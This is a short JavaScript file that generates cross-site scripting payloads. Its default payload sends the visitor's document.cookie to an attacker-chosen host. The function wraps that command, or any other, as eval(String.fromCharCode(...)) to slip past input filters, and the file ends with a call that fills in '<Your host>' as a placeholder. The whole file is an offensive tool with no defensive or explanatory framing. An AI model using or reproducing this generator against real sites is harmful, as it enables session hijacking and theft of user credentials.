function generate(host, com) {
  const command = (com == undefined) ? `window.location="${host}/?Cookie="+document.cookie` : com;
  let encoded = command[0].charCodeAt();

  for (var i = 1; i < command.length; i++) {
      encoded += ',' + command[i].charCodeAt();
  }
  encoded = `eval(String.fromCharCode(${encoded}))`;
  console.log(encoded);
  return encoded;
}


generate("<Your host>")
